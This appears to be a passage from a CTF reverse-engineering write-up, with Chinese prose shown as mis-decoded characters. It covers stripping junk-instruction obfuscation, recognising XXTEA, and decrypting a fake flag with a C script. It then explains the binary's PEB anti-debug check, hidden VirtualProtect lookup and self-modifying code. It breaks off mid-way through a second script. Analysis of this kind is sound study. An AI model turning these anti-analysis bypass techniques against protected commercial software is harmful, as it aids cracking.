src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733828856-dd977d3e-329b-4748-adea-648e1ca77d81.png#averageHue=%2320201f&amp;clientId=u9fbe6832-1fb1-4&amp;from=paste&amp;id=u4cff4822&amp;originHeight=843&amp;originWidth=1134&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=45021&amp;status=done&amp;style=none&amp;taskId=ucfe2b2a2-9d0a-4981-9d9d-5cd31dff461&amp;title=" alt="image.png"><br>å¦‚æœè¦è°ƒè¯•ï¼Œè¦å…ˆæŠŠç¬¬ä¸€ä¸ªå‡½æ•°nopæ‰ï¼ˆå®é™…ä¸Šå¹¶ä¸ç”¨ï¼‰<br>è¿™é‡Œå…ˆçœ‹encodeå‡½æ•°ï¼Œç‚¹å¼€åæ˜¯çˆ†çº¢çš„ï¼Œæ‰€ä»¥å…ˆè§£èŠ±æŒ‡ä»¤<br><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733828863-fffea6a3-e0ed-4f7f-bd78-ba319fdb93b0.png#averageHue=%23242120&amp;clientId=u9fbe6832-1fb1-4&amp;from=paste&amp;id=u640b1518&amp;originHeight=256&amp;originWidth=819&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=27837&amp;status=done&amp;style=none&amp;taskId=ub41b481a-0633-41c0-9641-9f79986b3f5&amp;title=" alt="image.png"><br>è¿™ä¸ªæ˜¯ä¸€ä¸ªç®€å•çš„jmpèŠ±æŒ‡ä»¤ï¼ŒæŠŠåé¢çš„jmp nopæ‰ï¼Œç„¶åå¯ä»¥çœ‹åˆ°ç¬¬ä¸€éƒ¨åˆ†ã€‚<br>è¿™æ—¶æœ€ä¸Šé¢è¿˜æ˜¯æœ‰æ ‡çº¢<br>åœ¨æ±‡ç¼–ç•Œé¢çœ‹çœ‹å“ªé‡Œè¿˜æœ‰èŠ±<br><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733828840-9379adb2-bb79-47ec-8e66-6b0b6186244b.png#averageHue=%23211f1f&amp;clientId=u9fbe6832-1fb1-4&amp;from=paste&amp;id=uf2076b9a&amp;originHeight=447&amp;originWidth=1027&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=46966&amp;status=done&amp;style=none&amp;taskId=ue7e65699-3668-4960-a21a-b46ea68bd25&amp;title=" alt="image.png"><br>è¿™é‡Œæœ‰ä¸€ä¸ªå¥‡æ€ªçš„callï¼š<br>é€»è¾‘æ˜¯ï¼šcallå®Œä¹‹åæŠŠretçš„å€¼+0xCç„¶åè¿”å›<br>æŠŠè¿™ä¸€éƒ¨åˆ†æŒ‰uè§£é™¤ï¼Œåœ¨åŠ 0xCåçš„ä½ç½®å†åç¼–è¯‘<br><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733828855-22c55bc8-7fc2-4b83-8efb-7c1c9f6b986d.png#averageHue=%23222121&amp;clientId=u9fbe6832-1fb1-4&amp;from=paste&amp;id=u8a8a33d3&amp;originHeight=902&amp;originWidth=982&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=57530&amp;status=done&amp;style=none&amp;taskId=u0a4f5158-d428-47e8-be3d-870a551763d&amp;title=" alt="image.png"><br>æ‰€ä»¥retä¹‹åå°±ä¼šåˆ°popçš„ä½ç½®<br>æŠŠä¸­é—´è¿™ä¸€æ®µå…¨éƒ¨nopï¼Œç„¶åæŠŠæ•´ä¸ªå‡½æ•°uï¼Œç„¶åcï¼Œå†æµè§ˆä¸€ä¸‹å‡½æ•°ï¼Œä¸­é—´æœ‰ä¸€ä¸ªæ€ªjmpï¼Œåˆ æ‰<br><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733828869-884a2f60-9285-4f64-90a8-423fd0e572e7.png#averageHue=%23383a2d&amp;clientId=u9fbe6832-1fb1-4&amp;from=paste&amp;id=u4183dfaa&amp;originHeight=914&amp;originWidth=1121&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=50453&amp;status=done&amp;style=none&amp;taskId=u23ab1c10-a1fa-4e75-af1b-62ab76f52ea&amp;title=" alt="image.png"><br>ç„¶åå†pï¼Œå¾—åˆ°è§£å®ŒèŠ±çš„å‡½æ•°</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall encode(__int64 a1, __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v2; // rcx</span><br><span class="line"> <span class="built_in"> int </span>v3; // eax</span><br><span class="line">  bool v4; // zf</span><br><span class="line"> <span class="built_in"> int </span>v5; // eax</span><br><span class="line"> <span class="built_in"> int </span>v7; // [rsp+2Ch] [rbp-34h]</span><br><span class="line"> <span class="built_in"> int </span>v8; // [rsp+30h] [rbp-30h]</span><br><span class="line">  unsigned<span class="built_in"> int </span>i; // [rsp+34h] [rbp-2Ch]</span><br><span class="line">  unsigned<span class="built_in"> int </span>v10; // [rsp+38h] [rbp-28h]</span><br><span class="line">  unsigned<span class="built_in"> int </span>v11; // [rsp+3Ch] [rbp-24h]</span><br><span class="line">  unsigned<span class="built_in"> int </span>v12; // [rsp+40h] [rbp-20h]</span><br><span class="line"> <span class="built_in"> int </span>v13; // [rsp+44h] [rbp-1Ch]</span><br><span class="line">  _BYTE v15[12]; // [rsp+54h] [rbp-Ch]</span><br><span class="line"></span><br><span class="line">  *(_QWORD *)&amp;v15[4] = a1;</span><br><span class="line">  *(_DWORD *)v15 = 0x9E3779B9;</span><br><span class="line">  v8 = 9;</span><br><span class="line">  v10 = 0;</span><br><span class="line">  v11 = *(_DWORD *)(a1 + 56);</span><br><span class="line">  do</span><br><span class="line">  &#123;</span><br><span class="line">    v10 -= 0x61C88647;</span><br><span class="line">    v7 = (v10 &gt;&gt; 2) &amp; 3;</span><br><span class="line">    for ( i = 0; ; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = 14i64;</span><br><span class="line">     <span class="built_in"> if </span>( i &gt;= 0xE )</span><br><span class="line">        break;</span><br><span class="line">      v12 = *(_DWORD *)(*(_QWORD *)&amp;v15[4] + 4i64 * (i + 1));</span><br><span class="line">      v3 = *(_DWORD *)(*(_QWORD *)&amp;v15[4] + 4i64 * i)</span><br><span class="line">         + (((v11 ^ *(_DWORD *)(a2 + 4i64 * (v7 ^ i &amp; 3))) + (v12 ^ v10)) ^ (((16 * v11) ^ (v12 &gt;&gt; 3))</span><br><span class="line">                                                                           + ((4 * v12) ^ (v11 &gt;&gt; 5))));</span><br><span class="line">      *(_DWORD *)(*(_QWORD *)&amp;v15[4] + 4i64 * i) = v3;</span><br><span class="line">      v11 = v3;</span><br><span class="line">    &#125;</span><br><span class="line">    v4 = **(_QWORD **)&amp;v15[4] == 0xEi64;</span><br><span class="line">    **(_QWORD **)&amp;v15[4] ^= 0xEui64;</span><br><span class="line">   <span class="built_in"> if </span>( v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = *(_QWORD *)v15;</span><br><span class="line">      **(_QWORD **)&amp;v15[4] += *(_QWORD *)v15;</span><br><span class="line">    &#125;</span><br><span class="line">    **(_QWORD **)&amp;v15[4] ^= v2;</span><br><span class="line">    v5 = *(_DWORD *)(*(_QWORD *)&amp;v15[4] + 56i64)</span><br><span class="line">       + (((v11 ^ *(_DWORD *)(a2 + 4i64 * (v7 ^ i &amp; 3))) + (**(_DWORD **)&amp;v15[4] ^ v10)) ^ (((16 * v11) ^ (**(_DWORD **)&amp;v15[4] &gt;&gt; 3))</span><br><span class="line">                                                                                          + ((4 * **(_DWORD **)&amp;v15[4]) ^ (v11 &gt;&gt; 5))));</span><br><span class="line">    *(_DWORD *)(*(_QWORD *)&amp;v15[4] + 56i64) = v5;</span><br><span class="line">    v11 = v5;</span><br><span class="line">    --v8;</span><br><span class="line">  &#125;</span><br><span class="line">  while ( v8 );</span><br><span class="line">  v13 = 60;</span><br><span class="line">  while ( v13 != 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    --v13;</span><br><span class="line">   <span class="built_in"> if </span>( *(unsigned __int8 *)(*(_QWORD *)&amp;v15[4] + v13) != (byte_7FF7A5187000[v13 + 1] ^ 0x23) )</span><br><span class="line">     <span class="built_in"> return </span>0;</span><br><span class="line">  &#125;</span><br><span class="line"> <span class="built_in"> return </span>1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªçš„ç‰¹å¾å¾ˆæ˜æ˜¾æ˜¯xxteaï¼Œå¹¶ä¸”æ²¡æœ‰é­”æ”¹ï¼Œç½‘ä¸Šç›´æ¥æœè„šæœ¬<br>expï¼š(éœ€è¦ç”¨clang)<br>(ç½‘ä¸Šçš„è„šæœ¬<a href="https://www.cnblogs.com/zpchcbd/p/15974293.html">https://www.cnblogs.com/zpchcbd/p/15974293.html</a>)</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio<span class="number">.</span>h&gt;</span><br><span class="line">#include &lt;stdint<span class="number">.</span>h&gt;</span><br><span class="line">#define DELTA <span class="number">0x9e3779b9</span></span><br><span class="line">#define MX (((z&gt;&gt;<span class="number">5</span>^y&lt;&lt;<span class="number">2</span>) + (y&gt;&gt;<span class="number">3</span>^z&lt;&lt;<span class="number">4</span>)) ^ ((sum^y) + (key[(p&amp;<span class="number">3</span>)^e] ^ z)))</span><br><span class="line"></span><br><span class="line">void btea(uint32_t* v, <span class="keyword">int</span> n, uint32_t const key[<span class="number">4</span>])</span><br><span class="line">&#123;</span><br><span class="line">uint32_t y, z, sum<span class="comment">;</span></span><br><span class="line">unsigned p, rounds, e<span class="comment">;</span></span><br><span class="line">if (n &gt; <span class="number">1</span>)            /* Coding Part */</span><br><span class="line">&#123;</span><br><span class="line">rounds = <span class="number">6</span> + <span class="number">52</span> / n<span class="comment">;</span></span><br><span class="line">sum = <span class="number">0</span><span class="comment">;</span></span><br><span class="line">z = v[n - <span class="number">1</span>]<span class="comment">;</span></span><br><span class="line"><span class="built_in">do</span></span><br><span class="line">&#123;</span><br><span class="line">sum += DELTA<span class="comment">;</span></span><br><span class="line">e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span><span class="comment">;</span></span><br><span class="line">for (p = <span class="number">0</span><span class="comment">; p &lt; n - 1; p++)</span></span><br><span class="line">&#123;</span><br><span class="line">y = v[p + <span class="number">1</span>]<span class="comment">;</span></span><br><span class="line">z = v[p] += MX<span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line">y = v[<span class="number">0</span>]<span class="comment">;</span></span><br><span class="line">z = v[n - <span class="number">1</span>] += MX<span class="comment">;</span></span><br><span class="line">&#125; while (--rounds)<span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line">else if (n &lt; -<span class="number">1</span>)      /* Decoding Part */</span><br><span class="line">&#123;</span><br><span class="line">n = -n<span class="comment">;</span></span><br><span class="line">rounds = <span class="number">6</span> + <span class="number">52</span> / n<span class="comment">;</span></span><br><span class="line">sum = rounds * DELTA<span class="comment">;</span></span><br><span class="line">y = v[<span class="number">0</span>]<span class="comment">;</span></span><br><span class="line"><span class="built_in">do</span></span><br><span class="line">&#123;</span><br><span class="line">e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span><span class="comment">;</span></span><br><span class="line">for (p = n - <span class="number">1</span><span class="comment">; p &gt; 0; p--)</span></span><br><span class="line">&#123;</span><br><span class="line">z = v[p - <span class="number">1</span>]<span class="comment">;</span></span><br><span class="line">y = v[p] -= MX<span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line">z = v[n - <span class="number">1</span>]<span class="comment">;</span></span><br><span class="line">y = v[<span class="number">0</span>] -= MX<span class="comment">;</span></span><br><span class="line">sum -= DELTA<span class="comment">;</span></span><br><span class="line">&#125; while (--rounds)<span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> main()</span><br><span class="line">&#123;</span><br><span class="line">unsigned char fakefalg[<span class="number">99</span>] = &#123; <span class="number">0xff</span>, <span class="number">0xef</span>, <span class="number">0x79</span>, <span class="number">0xbc</span>, <span class="number">0xda</span>, <span class="number">0x6c</span>, <span class="number">0xc9</span>,</span><br><span class="line"><span class="number">0xb1</span>, <span class="number">0x24</span>, <span class="number">0x90</span>, <span class="number">0x89</span>, <span class="number">0x5d</span>, <span class="number">0x99</span>,</span><br><span class="line"><span class="number">0x42</span>, <span class="number">0xe1</span>, <span class="number">0x15</span>, <span class="number">0xc1</span>, <span class="number">0x1b</span>, <span class="number">0x2a</span>,</span><br><span class="line"><span class="number">0x5a</span>, <span class="number">0x9f</span>, <span class="number">0x90</span>, <span class="number">0xe0</span>, <span class="number">0x5f</span>, <span class="number">0xe9</span>,</span><br><span class="line"><span class="number">0x74</span>, <span class="number">0x9d</span>, <span class="number">0x44</span>, <span class="number">0x0d</span>, <span class="number">0x56</span>, <span class="number">0xfd</span>,</span><br><span class="line"><span class="number">0x51</span>, <span class="number">0x7e</span>, <span class="number">0x34</span>, <span class="number">0x5a</span>, <span class="number">0xc5</span>, <span class="number">0x3a</span>,</span><br><span class="line"><span class="number">0x5e</span>, <span class="number">0x24</span>, <span class="number">0xbc</span>, <span class="number">0xe1</span>, <span class="number">0x40</span>, <span class="number">0x0d</span>,</span><br><span class="line"><span class="number">0x17</span>, <span class="number">0x68</span>, <span class="number">0xfc</span>, <span class="number">0xcc</span>, <span class="number">0x09</span>, <span class="number">0x5b</span>,</span><br><span class="line"><span class="number">0xff</span>, <span class="number">0xc9</span>, <span class="number">0x45</span>, <span class="number">0x19</span>, <span class="number">0xb6</span>, <span class="number">0xc9</span>,</span><br><span class="line"><span class="number">0x0a</span>, <span class="number">0x5e</span>, <span class="number">0xd9</span>, <span class="number">0x03</span>, <span class="number">0xb2</span>, <span class="number">0x48</span> &#125;<span class="comment">;</span></span><br><span class="line">for (<span class="keyword">int</span> i = <span class="number">0</span><span class="comment">; i &lt; 61; ++i) &#123;</span></span><br><span class="line">fakefalg[i] ^= <span class="number">0x23</span><span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line">uint32_t key[<span class="number">4</span>] = &#123; <span class="number">0x1234</span>,<span class="number">0x2341</span>,<span class="number">0x3412</span>,<span class="number">0x4123</span> &#125;<span class="comment">;</span></span><br><span class="line">btea((unsigned*)(fakefalg + <span class="number">1</span>), -<span class="number">15</span>, key)<span class="comment">;</span></span><br><span class="line">printf(<span class="string">&quot;è§£å¯†åçš„æ•°æ®ï¼š%s\n&quot;</span>, (char*)fakefalg)<span class="comment">;</span></span><br><span class="line">return <span class="number">0</span><span class="comment">;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¾—åˆ°å‡flagï¼š</p><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DRKCTF&#123;Sorry.There<span class="number">_</span><span class="keyword">is</span><span class="number">_n</span>o<span class="number">_m</span>ore<span class="number">_f</span>lower<span class="number">_</span>tea.Please<span class="number">_</span><span class="keyword">try</span><span class="number">_</span>again!!&#125;</span><br></pre></td></tr></table></figure><p>å¾ˆæ˜æ˜¾ï¼Œè¿™ä¸ªä¸æ˜¯çœŸflagï¼Œè¿™è¯´æ˜ï¼š<br>åŠ¨æ€è°ƒè¯•çš„æ—¶å€™å’Œæ­£å¸¸çš„æ—¶å€™è¿è¡Œçš„é€»è¾‘ä¸ä¸€æ ·<br>ç¬¬ä¸€æ—¶é—´ä¼šæƒ³åˆ°è¿™ä¸ªå¯èƒ½æ˜¯smcæˆ–è€…hook<br>æ‰€ä»¥å…ˆæŸ¥çœ‹encodeçš„äº¤å‰å¼•ç”¨ã€‚<br>äºæ˜¯æ‰¾åˆ°è¿™ä¸ªå‡½æ•°ï¼š<br><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733829975-153319f8-74d5-4986-8a9e-8f768ac45af7.png#averageHue=%23262523&amp;clientId=u9fbe6832-1fb1-4&amp;from=paste&amp;id=ue3859d07&amp;originHeight=175&amp;originWidth=342&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=13519&amp;status=done&amp;style=none&amp;taskId=u3580044d-d353-4778-a37c-19359f8ce4a&amp;title=" alt="image.png"><br>å¯ä»¥çœ‹åˆ°ä¸Šå±‚å‡½æ•°<br>ä¿®æ”¹äº†encodeä¸­çš„å‰å‡ ä¸ªå­—èŠ‚ç”¨retçš„æ–¹æ³•è¿”å›åˆ°sub_140012A0ä¸­<br><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733829989-1a9f71ea-f342-424a-af46-2cb10c1d5fee.png#averageHue=%23212120&amp;clientId=u9fbe6832-1fb1-4&amp;from=paste&amp;id=uc3c9f92e&amp;originHeight=449&amp;originWidth=1207&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=33860&amp;status=done&amp;style=none&amp;taskId=uf9eb6404-6a25-4a29-80c0-ffd3c2e2565&amp;title=" alt="image.png"><br>è¿™é‡Œçš„ç¬¬ä¸€ä¸ªæ˜¯åè°ƒè¯•ï¼Œåœ¨x64ä¸‹ï¼Œè°ƒè¯•æ ‡å¿—ä½åœ¨PEBè¡¨åç§»0x2çš„ä½ç½®ï¼Œé€šè¿‡è·å–gså¯„å­˜å™¨æ‰¾åˆ°pebè¡¨çš„ä½ç½®ï¼š<br>readsqword(0x62)å¾—åˆ°è°ƒè¯•æ ‡å¿—ä½å¹¶åˆ¤æ–­å½“å‰è¿›ç¨‹æ˜¯å¦åœ¨è°ƒè¯•<br><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733829985-4afa9be0-9bb4-4cb8-9f55-5dd9c717c765.png#averageHue=%23232222&amp;clientId=u9fbe6832-1fb1-4&amp;from=paste&amp;id=u7808a012&amp;originHeight=180&amp;originWidth=741&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=9782&amp;status=done&amp;style=none&amp;taskId=ud6d90f24-7c4d-416e-a406-ac032578606&amp;title=" alt="image.png"><br>blockæ˜¯å•çº¯åœ°å¾—åˆ°å¯¹åº”çš„ä¸¤ä¸ªå‡½æ•°åœ°å€<br>get_virtual_protectä¸­ï¼Œé€šè¿‡å¼‚æˆ–æŠŠvirtualprotectå‡½æ•°åéšè—å¹¶é€šè¿‡æœç´¢å®ƒåœ¨kernel32.dllä¸­ä½ç½®è¿”å›å‡½æ•°åœ°å€<br><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733829987-92034861-23bc-47d2-9e95-b4f30fa85fbe.png#averageHue=%23232221&amp;clientId=u9fbe6832-1fb1-4&amp;from=paste&amp;id=ud99782d9&amp;originHeight=483&amp;originWidth=557&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=29585&amp;status=done&amp;style=none&amp;taskId=u93815ed8-e441-450f-b0cc-314164f4205&amp;title=" alt="image.png"><br>é€šè¿‡ä¸Šé¢çš„åˆ†æï¼Œå¯ä»¥å¾—å‡ºæˆ‘ä»¬éœ€è¦æŸ¥çœ‹sub_140012A0çš„å†…å®¹ï¼Œè¿™é‡Œæ‰æ˜¯çœŸæ­£çš„åŠ å¯†å‡½æ•°<br>æ‰“å¼€ï¼Œè¿˜æ˜¯èŠ±QAQ<br>æ±‡ç¼–ä¸­ï¼Œå¯ä»¥çœ‹åˆ°å‡½æ•°åæ®µå…¨æ˜¯ä¸€ä¸ªæŒ‡ä»¤+ä¸€ä¸ªjmp<br>ç”±äºæ±‡ç¼–ä¸æ˜¯å¾ˆå¥½çœ‹ï¼Œæ”¹æˆæµç¨‹å›¾çœ‹å¥‡æ€ªçš„åœ°æ–¹ã€‚<br><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733829973-15def95e-8069-44cd-91a5-819ab44df3c5.png#averageHue=%23343436&amp;clientId=u9fbe6832-1fb1-4&amp;from=paste&amp;id=u120b6f3f&amp;originHeight=899&amp;originWidth=326&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=9261&amp;status=done&amp;style=none&amp;taskId=u70f5eff6-e16f-4590-91c9-49d7be337ea&amp;title=" alt="image.png"><br>å¯ä»¥çŒœæµ‹ï¼šå¦‚æœä¸€ä¸ªåœ°æ–¹æœ‰ä¸€å—ä»£ç ï¼Œå¹¶ä¸”æœ‰è¿ç»­jmpï¼Œè¿™é‡Œå¯èƒ½æ˜¯äººå·¥åŠ çš„èŠ±<br>é‚£ä¹ˆå°±å…ˆçœ‹ä¸€ä¸‹é‚£ä¸ªå¾ˆè¿œçš„ç¯å’Œä¸Šé¢ä¸€æ’æ²¡æœ‰å…¥å£çš„å—<br>1<br><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733832192-cef5fe2c-e686-4d46-b327-e5d7a3c01b20.png#averageHue=%23212120&amp;clientId=u9fbe6832-1fb1-4&amp;from=paste&amp;id=u0fa192bf&amp;originHeight=821&amp;originWidth=634&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=53017&amp;status=done&amp;style=none&amp;taskId=u0aa49f92-479d-4bac-b428-67c7d183fb5&amp;title=" alt="image.png"><br>è¿™é‡Œèƒ½çœ‹åˆ°pushå’Œpopï¼Œæ‰€ä»¥ä»pushè¿›å…¥èŠ±ï¼Œä»popç¦»å¼€èŠ±ï¼Œå¯ä»¥çœ‹å‡ºå¯ä»¥è¿™æ ·è¿˜åŸ<br>2<br><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733832265-37061b1b-0f12-4caf-8153-cba463e120d5.png#averageHue=%23242322&amp;clientId=u9fbe6832-1fb1-4&amp;from=paste&amp;id=u065c3468&amp;originHeight=933&amp;originWidth=1035&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=123404&amp;status=done&amp;style=none&amp;taskId=u110b76e5-e698-4870-9616-0dac6ca2b32&amp;title=" alt="image.png"><br>è¿™é‡Œæœ‰ä¸€ä¸ªcallï¼Œå°è¯•è·Ÿç€callèµ°ï¼Œå®ƒä¸‹ä¸€æ­¥ä¿®æ”¹äº†è¿”å›åœ°å€ï¼Œå‡å»5A<br>å³ï¼š140001460<br>è½¬æ¢ä¸€ä¸‹è¿™é‡Œçš„æŒ‡ä»¤<br><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733832191-1cc0fbe0-3f81-4909-a497-5295e5abc4db.png#averageHue=%23282726&amp;clientId=u9fbe6832-1fb1-4&amp;from=paste&amp;id=u50bfb4ab&amp;originHeight=50&amp;originWidth=338&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=2785&amp;status=done&amp;style=none&amp;taskId=ueb56bbeb-3453-4f58-b939-3e8e83aa1b3&amp;title=" alt="image.png"><br>æ‰€ä»¥æŠŠcall nopäº†å°±å¥½<br><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733832182-3eb75a93-c094-4099-be25-76c4f9d44050.png#averageHue=%23535739&amp;clientId=u9fbe6832-1fb1-4&amp;from=paste&amp;id=ue655d849&amp;originHeight=215&amp;originWidth=428&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=3787&amp;status=done&amp;style=none&amp;taskId=u28dc4c33-1a0b-4666-82b4-37908298542&amp;title=" alt="image.png"><br>3<br><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733832201-20c08a69-26d7-4428-95f8-6a320ed5339b.png#averageHue=%23232221&amp;clientId=u9fbe6832-1fb1-4&amp;from=paste&amp;id=u9a6a4d18&amp;originHeight=270&amp;originWidth=476&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=12030&amp;status=done&amp;style=none&amp;taskId=u6996037f-ff56-4fac-9424-57aa1df09f5&amp;title=" alt="image.png"><br>nopä¹‹å<br>ç„¶åå…¨éƒ¨uï¼Œcï¼Œpè¿˜åŸå‡½æ•°<br><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733834495-e9f6427f-ca83-4dc5-9162-da08a490e772.png#averageHue=%2320201f&amp;clientId=u9fbe6832-1fb1-4&amp;from=paste&amp;id=ua1b08400&amp;originHeight=941&amp;originWidth=1251&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=66758&amp;status=done&amp;style=none&amp;taskId=ud999defe-5b98-4c43-b6af-623c89dd5f4&amp;title=" alt="image.png"><br>è¿™é‡Œåˆå¯ä»¥çœ‹åˆ°ä¸Šé¢çš„ä¸€ä¸ªå¥‡æ€ªreturnï¼Œçœ‹æ±‡ç¼–å¯ä»¥å‘ç°è¿˜æ˜¯ä¸€ä¸ªèŠ±<br><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733834450-c2ef6d71-3686-447f-ab49-66e8d87bac19.png#averageHue=%23272221&amp;clientId=u9fbe6832-1fb1-4&amp;from=paste&amp;id=uad94fd86&amp;originHeight=387&amp;originWidth=835&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=28232&amp;status=done&amp;style=none&amp;taskId=uddf8219b-4679-4003-a0a0-f0876da42bd&amp;title=" alt="image.png"><br>ç›´æ¥æŠŠcallåˆ°retnå»æ‰ï¼ˆé™¤äº†shlï¼‰<br>è¿™æ˜¯ä¸€ä¸ªå˜ä½“teaï¼Œå°è¯•åŒ–ç®€è¿™ä¸ªå‡½æ•°<br><img src="https://cdn.nlark.com/yuque/0/2024/png/33730407/1716733834514-bfee2ec3-61aa-4829-9c9b-096656970bac.png#averageHue=%2320201f&amp;clientId=u9fbe6832-1fb1-4&amp;from=paste&amp;id=uc65b387a&amp;originHeight=910&amp;originWidth=974&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=89317&amp;status=done&amp;style=none&amp;taskId=uc8d53d53-53c1-44c7-af9e-dc9500873e0&amp;title=" alt="image.png"><br>å†™è„šæœ¬ç›´æ¥è§£<br>exp:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 